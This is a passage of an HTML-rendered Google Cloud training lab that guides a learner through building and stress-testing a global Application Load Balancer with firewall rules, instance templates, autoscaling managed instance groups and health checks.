0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">"Username"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Username in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Copy the </span><strong><span>Password</span></strong><span> below and paste it into the </span><strong><span>Welcome</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">"Password"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Password in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p><p><strong><span>Important:</span></strong><span> You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.</span></p><p><strong><span>Note:</span></strong><span> Using your own Google Cloud account for this lab may incur extra charges.</span></p></li><li><p><span>Click through the subsequent pages:</span></p><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul></li></ol><p><span>After a few moments, the Google Cloud console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> To access Google Cloud products and services, click the </span><strong><span>Navigation menu</span></strong><span> or type the service or product name in the </span><strong><span>Search</span></strong><span> field. </span><img src="images\9Fk8NYFp3quE9mF%2FilWF6%2FlXY9OUBi3UWtb2Ne4uXNU%3D" referrerpolicy="no-referrer" alt="Navigation menu icon and Search field"></p><h3 id='task-1-configure-http-and-health-check-firewall-rules-2'><span>Task 1. Configure HTTP and health check firewall rules</span></h3><p><span>Configure firewall rules to allow HTTP traffic to the backends and TCP traffic from the Google Cloud health checker.</span></p><h4 id='create-the-http-firewall-rule-2'><span>Create the HTTP firewall rule</span></h4><p><span>Create a firewall rule to allow HTTP traffic to the backends.</span></p><ol start='' ><li><p><span>In the Cloud console, navigate to </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; </span><strong><span>VPC network</span></strong><span> &gt; </span><strong><span>Firewall</span></strong><span>.</span></p></li><li><p><span>Notice the existing </span><strong><span>ICMP</span></strong><span>, </span><strong><span>internal</span></strong><span>, </span><strong><span>RDP</span></strong><span>, and </span><strong><span>SSH</span></strong><span> firewall rules.</span></p><p><span>Each Google Cloud project starts with the </span><strong><span>default</span></strong><span> network and these firewall rules.</span></p></li><li><p><span>Click </span><strong><span>Create Firewall Rule</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>default-allow-http</span></td></tr><tr><td style='text-align:left;' ><span>Network</span></td><td style='text-align:left;' ><span>default</span></td></tr><tr><td style='text-align:left;' ><span>Targets</span></td><td style='text-align:left;' ><span>Specified target tags</span></td></tr><tr><td style='text-align:left;' ><span>Target tags</span></td><td style='text-align:left;' ><span>http-server</span></td></tr><tr><td style='text-align:left;' ><span>Source filter</span></td><td style='text-align:left;' ><span>IPv4 Ranges</span></td></tr><tr><td style='text-align:left;' ><span>Source IPv4 ranges</span></td><td style='text-align:left;' ><span>0.0.0.0/0</span></td></tr><tr><td style='text-align:left;' ><span>Protocols and ports</span></td><td style='text-align:left;' ><span>Specified protocols and ports, and then </span><em><span>check</span></em><span> TCP, </span><em><span>type:</span></em><span> 80</span></td></tr></tbody></table></figure></li></ol><p><span>Make sure to include the </span><strong><span>/0</span></strong><span> in the </span><strong><span>Source IPv4 ranges</span></strong><span> to specify all networks.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><h4 id='create-the-health-check-firewall-rules-2'><span>Create the health check firewall rules</span></h4><p><span>Health checks determine which instances of a load balancer can receive new connections. For Application Load Balancing, the health check probes to your load balanced instances come from addresses in the ranges </span><code>130.211.0.0/22</code><span> and </span><code>35.191.0.0/16</code><span>. Your firewall rules must allow these connections.</span></p><ol start='' ><li><p><span>Still in the </span><strong><span>Firewall policies</span></strong><span> page, click </span><strong><span>Create Firewall Rule</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>default-allow-health-check</span></td></tr><tr><td style='text-align:left;' ><span>Network</span></td><td style='text-align:left;' ><span>default</span></td></tr><tr><td style='text-align:left;' ><span>Targets</span></td><td style='text-align:left;' ><span>Specified target tags</span></td></tr><tr><td style='text-align:left;' ><span>Target tags</span></td><td style='text-align:left;' ><span>http-server</span></td></tr><tr><td style='text-align:left;' ><span>Source filter</span></td><td style='text-align:left;' ><span>IPv4 Ranges</span></td></tr><tr><td style='text-align:left;' ><span>Source IPv4 ranges</span></td><td style='text-align:left;' ><code>130.211.0.0/22</code><span>, </span><code>35.191.0.0/16</code></td></tr><tr><td style='text-align:left;' ><span>Protocols and ports</span></td><td style='text-align:left;' ><span>Specified protocols and ports, and then </span><em><span>check</span></em><span> TCP</span></td></tr></tbody></table></figure><p><strong><span>Note:</span></strong><span> Make sure to enter the two </span><strong><span>Source IPv4 ranges</span></strong><span> one-by-one and press SPACE in between them.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Configure HTTP and health check firewall rules</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='task-2-configure-instance-templates-and-create-instance-groups-2'><span>Task 2. Configure instance templates and create instance groups</span></h3><p><span>A managed instance group uses an instance template to create a group of identical instances. Use these to create the backends of the Application Load Balancer.</span></p><h4 id='configure-the-instance-templates-3'><span>Configure the instance templates</span></h4><p><span>An instance template is an API resource that you use to create VM instances and managed instance groups. Instance templates define the machine type, boot disk image, subnet, labels, and other instance properties.</span></p><p><span>Create one instance template for </span><code>Region 1</code><span> and one for </span><code>Region 2</code><span>.</span></p><ol start='' ><li><p><span>In the Cloud console, go to </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>Instance templates</span></strong><span>, and then click </span><strong><span>Create instance template</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Name</span></strong><span>, type </span><strong><code>Region 1</code><span>-template</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Location</span></strong><span>, Select </span><strong><span>Global</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Series</span></strong><span>, select </span><strong><span>E2</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Machine Type</span></strong><span>, select </span><strong><span>e2-micro</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Advanced Options</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Networking</span></strong><span>. Set the following value and leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Network tags</span></td><td style='text-align:left;' ><span>http-server</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>default</span></strong><span> under </span><strong><span>Network interfaces</span></strong><span>. Set the following values and leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Network</span></td><td style='text-align:left;' ><span>default</span></td></tr><tr><td style='text-align:left;' ><span>Subnetwork</span></td><td style='text-align:left;' ><span>default </span><code>Region 1</code></td></tr></tbody></table></figure><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li></ol><p><span>The network tag </span><strong><span>http-server</span></strong><span> ensures that the </span><strong><span>HTTP</span></strong><span> and </span><strong><span>Health Check</span></strong><span> firewall rules apply to these instances.</span></p><ol start='' ><li><p><span>Click the </span><strong><span>Management</span></strong><span> tab.</span></p></li><li><p><span>Under </span><strong><span>Metadata</span></strong><span>, click </span><strong><span>+ ADD ITEM</span></strong><span> and specify the following:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Key</span></th><th style='text-align:left;' ><span>Value</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>startup-script-url</span></td><td style='text-align:left;' ><span>gs://cloud-training/gcpnet/httplb/startup.sh</span></td></tr></tbody></table></figure></li></ol><p><span>The </span><code>startup-script-url</code><span> specifies a script that executes when instances are started. This script installs Apache and changes the welcome page to include the client IP and the name, region, and zone of the VM instance. Feel free to explore </span><a href='https://storage.googleapis.com/cloud-training/gcpnet/httplb/startup.sh'><span>this script</span></a><span>.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li><li><p><span>Wait for the instance template to be created.</span></p></li></ol><p><span>Now create another instance template for </span><strong><span>subnet-b</span></strong><span> by copying </span><strong><code>Region 1</code><span>-template</span></strong><span>:</span></p><ol start='' ><li><p><span>Click on </span><strong><code>Region 1</code><span>-template</span></strong><span> and then click on the </span><strong><span>+CREATE SIMILAR</span></strong><span> option from the top.</span></p></li><li><p><span>For </span><strong><span>Name</span></strong><span>, type </span><strong><code>Region 2</code><span>-template</span></strong><span>.</span></p></li><li><p><span>Ensure </span><strong><span>Location</span></strong><span> is selected </span><strong><span>Global</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Advanced Options</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Networking</span></strong><span>.</span></p></li><li><p><span>Ensure </span><strong><span>http-server</span></strong><span> is added as a </span><strong><span>network tag</span></strong><span>.</span></p></li><li><p><span>In </span><strong><span>Network interfaces</span></strong><span>, for </span><strong><span>Subnetwork</span></strong><span>, select </span><strong><span>default (</span><code>Region 2</code><span>)</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><h4 id='create-the-managed-instance-groups-2'><span>Create the managed instance groups</span></h4><p><span>Create a managed instance group in </span><strong><code>Region 1</code></strong><span> and one in </span><strong><code>Region 2</code></strong><span>.</span></p><ol start='' ><li><p><span>Still in </span><strong><span>Compute Engine</span></strong><span>, click </span><strong><span>Instance groups</span></strong><span> in the left menu.</span></p></li><li><p><span>Click </span><strong><span>Create instance group</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><code>Region 1</code><span>-mig (if required, remove extra space from the name)</span></td></tr><tr><td style='text-align:left;' ><span>Instance template</span></td><td style='text-align:left;' ><code>Region 1</code><span>-template</span></td></tr><tr><td style='text-align:left;' ><span>Location</span></td><td style='text-align:left;' ><span>Multiple zones</span></td></tr><tr><td style='text-align:left;' ><span>Region</span></td><td style='text-align:left;' ><code>Region 1</code></td></tr><tr><td style='text-align:left;' ><span>Minimum number of instances</span></td><td style='text-align:left;' ><span>1</span></td></tr><tr><td style='text-align:left;' ><span>Maximum number of instances</span></td><td style='text-align:left;' ><span>2</span></td></tr><tr><td style='text-align:left;' ><span>Autoscaling signals &gt; Click dropdown &gt; Signal type</span></td><td style='text-align:left;' ><span>CPU utilization</span></td></tr><tr><td style='text-align:left;' ><span>Target CPU utilization</span></td><td style='text-align:left;' ><span>80, click </span><strong><span>Done</span></strong><span>.</span></td></tr><tr><td style='text-align:left;' ><span>Initialization period</span></td><td style='text-align:left;' ><span>45</span></td></tr></tbody></table></figure></li></ol><p><span>Managed instance groups offer </span><strong><span>autoscaling</span></strong><span> capabilities that allow you to automatically add or remove instances from a managed instance group based on increases or decreases in load. Autoscaling helps your applications gracefully handle increases in traffic and reduces cost when the need for resources is lower. You just define the autoscaling policy and the autoscaler performs automatic scaling based on the measured load.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>Now repeat the same procedure to create a second instance group for </span><strong><code>Region 2</code><span>-mig</span></strong><span> in </span><strong><code>Region 2</code></strong><span>:</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create Instance group</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><code>Region 2</code><span>-mig</span></td></tr><tr><td style='text-align:left;' ><span>Instance template</span></td><td style='text-align:left;' ><code>Region 2</code><span>-template</span></td></tr><tr><td style='text-align:left;' ><span>Location</span></td><td style='text-align:left;' ><span>Multiple zones</span></td></tr><tr><td style='text-align:left;' ><span>Region</span></td><td style='text-align:left;' ><code>Region 2</code></td></tr><tr><td style='text-align:left;' ><span>Minimum number of instances</span></td><td style='text-align:left;' ><span>1</span></td></tr><tr><td style='text-align:left;' ><span>Maximum number of instances</span></td><td style='text-align:left;' ><span>2</span></td></tr><tr><td style='text-align:left;' ><span>Autoscaling signals &gt; Click dropdown &gt; Signal type</span></td><td style='text-align:left;' ><span>CPU utilization</span></td></tr><tr><td style='text-align:left;' ><span>Target CPU utilization</span></td><td style='text-align:left;' ><span>80, click </span><strong><span>Done</span></strong><span>.</span></td></tr><tr><td style='text-align:left;' ><span>Initialization period</span></td><td style='text-align:left;' ><span>45</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Configure instance templates and instance group</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='verify-the-backends-3'><span>Verify the backends</span></h4><p><span>Verify that VM instances are being created in both regions and access their HTTP sites.</span></p><ol start='' ><li><p><span>Still in </span><strong><span>Compute Engine</span></strong><span>, click </span><strong><span>VM instances</span></strong><span> in the left menu.</span></p></li><li><p><span>Notice the instances that start with </span><code>Region 1</code><span>-mig and </span><code>Region 2</code><span>-mig.</span></p><p><span>These instances are part of the managed instance groups.</span></p></li><li><p><span>Click on the </span><strong><span>External IP</span></strong><span> of an instance of </span><code>Region 1</code><span>-mig.</span></p><p><span>You should see the </span><strong><span>Client IP</span></strong><span> (your IP address), the </span><strong><span>Hostname</span></strong><span> (starts with </span><code>Region 1</code><span>-mig) and the </span><strong><span>Server Location</span></strong><span> (a zone in </span><code>Region 1</code><span>).</span></p></li><li><p><span>Click on the </span><strong><span>External IP</span></strong><span> of an instance of </span><code>Region 2</code><span>-mig.</span></p><p><span>You should see the </span><strong><span>Client IP</span></strong><span> (your IP address), the </span><strong><span>Hostname</span></strong><span> (starts with </span><code>Region 2</code><span>-mig) and the </span><strong><span>Server Location</span></strong><span> (a zone in </span><code>Region 2</code><span>).</span></p></li></ol><p><strong><span>Note:</span></strong><span> The </span><strong><span>Hostname</span></strong><span> and </span><strong><span>Server Location</span></strong><span> identifies where the Application Load Balancer sends traffic.</span></p><p>&nbsp;</p><p><span>Which of these fields identify the region of the backend?</span></p><p>&nbsp;</p><p><span>Server Location</span></p><p>&nbsp;</p><p><span>Client IP</span></p><p>&nbsp;</p><p><span>Hostname</span></p><p>&nbsp;</p><p><span>Submit</span></p><p>&nbsp;</p><h3 id='task-3-configure-the-application-load-balancer'><span>Task 3. Configure the Application Load Balancer</span></h3><p><span>Configure the Application Load Balancer to balance traffic between the two backends (</span><strong><code>Region 1</code><span>-mig</span></strong><span> in </span><code>Region 1</code><span> and </span><strong><code>Region 2</code><span>-mig</span></strong><span> in </span><code>Region 2</code><span>), as illustrated in the network diagram:</span></p><p><img src="images\7wJtCqbfTFLwKCpOMzUSyPjVKBjUouWHbduOqMpfRiM%3D" referrerpolicy="no-referrer" alt="Network diagram that illustrates load balancing"></p><h4 id='start-the-configuration-4'><span>Start the configuration</span></h4><ol start='' ><li><p><span>In the Cloud console, click </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; click </span><strong><span>VIEW ALL PRODUCTS</span></strong><span> &gt; </span><strong><span>Networking</span></strong><span> &gt; </span><strong><span>Network Services</span></strong><span> &gt; </span><strong><span>Load balancing</span></strong><span>.</span></p></li><li><p><span>click </span><strong><span>Create load balancer</span></strong><span>.</span></p></li><li><p><span>Under </span><strong><span>Application Load Balancer HTTP(S)</span></strong><span>, click Next.</span></p></li><li><p><span>For </span><strong><span>Public facing or internal</span></strong><span>, select </span><strong><span>Public facing (external)</span></strong><span> and click Next.</span></p></li><li><p><span>For </span><strong><span>Global or single region deployment</span></strong><span>, select </span><strong><span>Best for global workloads</span></strong><span> and click Next.</span></p></li><li><p><span>For </span><strong><span>Create load balancer</span></strong><span>, click </span><strong><span>Configure</span></strong><span>.</span></p></li><li><p><span>Set </span><strong><span>Load Balancer Name</span></strong><span> to </span><code>http-lb</code><span>.</span></p></li></ol><h4 id='configure-the-frontend-4'><span>Configure the frontend</span></h4><p><span>The host and path rules determine how your traffic will be directed. For example, you could direct video traffic to one backend and static traffic to another backend. However, you are not configuring the Host and path rules in this lab.</span></p><ol start='' ><li><p><span>Click on </span><strong><span>Frontend configuration</span></strong><span>.</span></p></li><li><p><span>Specify the following, leaving all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Protocol</span></td><td style='text-align:left;' ><span>HTTP</span></td></tr><tr><td style='text-align:left;' ><span>IP version</span></td><td style='text-align:left;' ><span>IPv4</span></td></tr><tr><td style='text-align:left;' ><span>IP address</span></td><td style='text-align:left;' ><span>Ephemeral</span></td></tr><tr><td style='text-align:left;' ><span>Port</span></td><td style='text-align:left;' ><span>80</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Add Frontend IP and port</span></strong><span>.</span></p></li><li><p><span>Specify the following, leaving all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Protocol</span></td><td style='text-align:left;' ><span>HTTP</span></td></tr><tr><td style='text-align:left;' ><span>IP version</span></td><td style='text-align:left;' ><span>IPv6</span></td></tr><tr><td style='text-align:left;' ><span>IP address</span></td><td style='text-align:left;' ><span>Auto-allocate</span></td></tr><tr><td style='text-align:left;' ><span>Port</span></td><td style='text-align:left;' ><span>80</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li></ol><p><span>Application Load Balancing supports both IPv4 and IPv6 addresses for client traffic. Client IPv6 requests are terminated at the global load balancing layer, then proxied over IPv4 to your backends.</span></p><h4 id='configure-the-backend-3'><span>Configure the backend</span></h4><p><span>Backend services direct incoming traffic to one or more attached backends. Each backend is composed of an instance group and additional serving capacity metadata.</span></p><ol start='' ><li><p><span>Click on </span><strong><span>Backend configuration</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Backend services &amp; backend buckets</span></strong><span>, click </span><strong><span>Create a backend service</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>http-backend</span></td></tr><tr><td style='text-align:left;' ><span>Instance group</span></td><td style='text-align:left;' ><code>Region 1</code><span>-mig</span></td></tr><tr><td style='text-align:left;' ><span>Port numbers</span></td><td style='text-align:left;' ><span>80</span></td></tr><tr><td style='text-align:left;' ><span>Balancing mode</span></td><td style='text-align:left;' ><span>Rate</span></td></tr><tr><td style='text-align:left;' ><span>Maximum RPS</span></td><td style='text-align:left;' ><span>50</span></td></tr><tr><td style='text-align:left;' ><span>Capacity</span></td><td style='text-align:left;' ><span>100</span></td></tr></tbody></table></figure></li></ol><p><span>This configuration means that the load balancer attempts to keep each instance of </span><strong><code>Region 1</code><span>-mig</span></strong><span> at or below 50 requests per second (RPS).</span></p><ol start='' ><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Add a backend</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Instance group</span></td><td style='text-align:left;' ><code>Region 2</code><span>-mig</span></td></tr><tr><td style='text-align:left;' ><span>Port numbers</span></td><td style='text-align:left;' ><span>80</span></td></tr><tr><td style='text-align:left;' ><span>Balancing mode</span></td><td style='text-align:left;' ><span>Utilization</span></td></tr><tr><td style='text-align:left;' ><span>Maximum backend utilization</span></td><td style='text-align:left;' ><span>80</span></td></tr><tr><td style='text-align:left;' ><span>Capacity</span></td><td style='text-align:left;' ><span>100</span></td></tr></tbody></table></figure></li></ol><p><span>This configuration means that the load balancer attempts to keep each instance of </span><strong><code>Region 2</code><span>-mig</span></strong><span> at or below 80% CPU utilization.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Health Check</span></strong><span>, select </span><strong><span>Create a health check</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>http-health-check</span></td></tr><tr><td style='text-align:left;' ><span>Protocol</span></td><td style='text-align:left;' ><span>TCP</span></td></tr><tr><td style='text-align:left;' ><span>Port</span></td><td style='text-align:left;' ><span>80</span></td></tr></tbody></table></figure></li></ol><p><span>Health checks determine which instances receive new connections. This HTTP health check polls instances every 5 seconds, waits up to 5 seconds for a response and treats 2 successful or 2 failed attempts as healthy or unhealthy, respectively.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Save</span></strong><span>.</span></p></li><li><p><span>Check the </span><strong><span>Enable Logging</span></strong><span> box.</span></p></li><li><p><span>Set the </span><strong><span>Sample Rate</span></strong><span> to </span><code>1</code><span>.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span> to create the backend service.</span></p></li><li><p><span>Click </span><strong><span>Ok</span></strong><span>.</span></p></li></ol><h4 id='review-and-create-the-application-load-balancer'><span>Review and create the Application Load Balancer</span></h4><ol start='' ><li><p><span>Click on </span><strong><span>Review and finalize</span></strong><span>.</span></p></li><li><p><span>Review the </span><strong><span>Backend</span></strong><span> and </span><strong><span>Frontend</span></strong><span> services.</span></p></li><li><p><span>Click on </span><strong><span>Create</span></strong><span>.</span></p></li><li><p><span>Wait for the load balancer to be created.</span></p></li><li><p><span>Click on the name of the load balancer (</span><strong><span>http-lb</span></strong><span>).</span></p></li><li><p><span>Note the IPv4 and IPv6 addresses of the load balancer for the next task. They will be referred to as </span><code>[LB_IP_v4]</code><span> and </span><code>[LB_IP_v6]</code><span>, respectively.</span></p></li></ol><p><strong><span>Note:</span></strong><span> The IPv6 address is the one in hexadecimal format.</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Configure the Application Load Balancer</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='task-4-test-the-application-load-balancer'><span>Task 4. Test the Application Load Balancer</span></h3><p><span>Now that you created the Application Load Balancer for your backends, verify that traffic is forwarded to the backend service.</span></p><p>&nbsp;</p><p><span>The Application Load Balancer should forward traffic to the region that is closest to you.</span></p><p>&nbsp;</p><p><span>True</span></p><p>&nbsp;</p><p><span>False</span></p><p>&nbsp;</p><h4 id='access-the-application-load-balancer'><span>Access the Application Load Balancer</span></h4><p><span>To test IPv4 access to the Application Load Balancer, open a new tab in your browser and navigate to </span><code>http://[LB_IP_v4]</code><span>. Make sure to replace </span><code>[LB_IP_v4]</code><span> with the IPv4 address of the load balancer.</span></p><p><strong><span>Note:</span></strong><span> It might take up to 5 minutes to access the Application Load Balancer. In the meantime, you might get a 404 or 502 error. Keep trying until you see the page of one of the backends.</span></p><p><strong><span>Note:</span></strong><span> Depending on your proximity to </span><strong><code>Region 1</code></strong><span> and </span><strong><code>Region 2</code></strong><span>, your traffic is either forwarded to a </span><strong><code>Region 1</code><span>-mig</span></strong><span> or </span><strong><code>Region 2</code><span>-mig</span></strong><span> instance.</span></p><p><span>If you have a local IPv6 address, try the IPv6 address of the Application Load Balancer by navigating to </span><code>http://[LB_IP_v6]</code><span>. Make sure to replace </span><code>[LB_IP_v6]</code><span> with the IPv6 address of the load balancer.</span></p><h4 id='stress-test-the-application-load-balancer'><span>Stress test the Application Load Balancer</span></h4><p><span>Create a new VM to simulate a load on the Application Load Balancer using </span><code>siege</code><span>. Then, determine if traffic is balanced across both backends when the load is high.</span></p><ol start='' ><li><p><span>In the console, navigate to </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>VM instances</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create instance</span></strong><span>.</span></p></li><li><p><span>In the </span><strong><span>Machine configuration</span></strong><span>:</span></p><p><span>Select the following values:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>siege-vm</span></td></tr><tr><td style='text-align:left;' ><span>Region</span></td><td style='text-align:left;' ><code>Region 3</code></td></tr><tr><td style='text-align:left;' ><span>Zone</span></td><td style='text-align:left;' ><code>Zone 3</code></td></tr><tr><td style='text-align:left;' ><span>Series</span></td><td style='text-align:left;' ><code>E2</code></td></tr></tbody></table></figure></li></ol><p><span>Given that </span><strong><code>Region 3</code></strong><span> is closer to </span><strong><code>Region 1</code></strong><span> than to </span><strong><code>Region 2</code></strong><span>, traffic should be forwarded only to 